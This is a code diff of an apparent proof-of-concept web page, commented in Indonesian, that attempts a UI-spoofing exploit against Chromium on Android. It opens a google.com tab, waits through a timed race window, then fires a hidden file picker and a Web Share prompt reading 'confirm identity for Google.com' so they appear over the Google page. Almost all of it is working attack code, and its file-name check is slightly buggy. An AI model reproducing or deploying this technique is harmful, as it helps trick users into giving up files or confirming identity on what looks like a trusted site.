@@ -3,46 +3,71 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Research - UI Redress</title>
+    <title>Bypass Research - Chromium UI</title>
     <style>
-        body { margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; background: #202124; color: white; font-family: sans-serif; }
-        #trigger { padding: 25px 50px; background: #8ab4f8; color: black; border-radius: 30px; font-weight: bold; cursor: pointer; border: none; font-size: 1.1rem; }
+        body { margin: 0; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; background: #000; color: #0f0; font-family: monospace; }
+        .box { border: 2px solid #0f0; padding: 30px; text-align: center; border-radius: 15px; box-shadow: 0 0 20px #0f0; }
+        #start-btn { background: #0f0; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; border-radius: 5px; margin-top: 20px; }
         #fileInput { display: none; }
     </style>
 </head>
 <body>
 
+    <div class="box">
+        <h2>SECURITY AUDIT MODE</h2>
+        <p>Klik tombol di bawah untuk simulasi verifikasi tab.</p>
+        <button id="start-btn">VERIFIKASI & LANJUTKAN</button>
+    </div>
+
     <input type="file" id="fileInput">
-    <button id="trigger">Lanjutkan Sinkronisasi</button>
 
     <script>
-        const trigger = document.getElementById('trigger');
+        const btn = document.getElementById('start-btn');
         const fileInput = document.getElementById('fileInput');
 
-        trigger.addEventListener('click', () => {
-            // 1. Inisialisasi navigasi ke tab baru
-            // Kita simpan referensi window untuk "mengelabui" manajemen fokus
-            const newTab = window.open('about:blank', '_blank');
+        // Fungsi pembantu untuk membuat delay berbasis Promise
+        const wait = (ms) => new Promise(res => setTimeout(res, ms));
 
-            // 2. Gunakan micro-delay untuk menyisipkan dialog
-            // Tujuannya agar dialog terpanggil SAAT tab baru sedang 'request focus'
-            setTimeout(() => {
-                // Navigasikan tab baru ke target asli (Google)
-                if (newTab) {
-                    newTab.location.href = 'https://www.google.com';
+        btn.addEventListener('click', async () => {
+            /**
+             * TEKNIK: ASYNC GESTURE PERSISTENCE
+             * Kita memicu navigasi tab baru, namun kita tetap menahan eksekusi
+             * kode di tab ini menggunakan 'await'.
+             */
+            
+            // 1. Buka tab target (Google)
+            const target = window.open('https://www.google.com', '_blank');
+
+            // 2. Trik Kritis: Menunggu transisi OS Android selesai (Race Condition)
+            // Jeda 250ms - 400ms sering kali adalah jendela di mana Chrome 
+            // belum sepenuhnya memutus 'User Activation' dari tab sebelumnya.
+            await wait(350);
+
+            try {
+                /**
+                 * 3. Eksekusi API secara 'pancaran'. 
+                 * Kita panggil File Picker tepat saat tab baru sedang fokus.
+                 * Jika patch fokus belum sempurna, dialog akan muncul di atas tab Google.
+                 */
+                fileInput.click();
+
+                // Opsional: Coba tembak Web Share API sekaligus sebagai fallback
+                if (navigator.share) {
+                    navigator.share({
+                        title: 'Required Action',
+                        text: 'Konfirmasi identitas untuk Google.com',
+                        url: 'https://google.com'
+                    }).catch(() => {});
                 }
 
-                // Tepat setelah instruksi navigasi, tembak dialog file picker
-                // Ini mencoba memanfaatkan celah saat browser sedang sibuk memproses navigasi
-                fileInput.click();
-                
-            }, 150); // Delay 150ms adalah celah kritis pada transisi UI Android
+            } catch (e) {
+                console.log("Blokir keamanan terdeteksi.");
+            }
         });
 
         fileInput.onchange = (e) => {
             if (e.target.files.length > 0) {
-                console.log('POC Berhasil: File diakses oleh tab latar belakang.');
-                alert('Peringatan: File "' + e.target.files.name + '" berhasil dikirim ke tab penyerang!');
+                alert("SPOOF BERHASIL!\nTab latar belakang mendapatkan akses ke: " + e.target.files.name);
             }
         };
     </script>
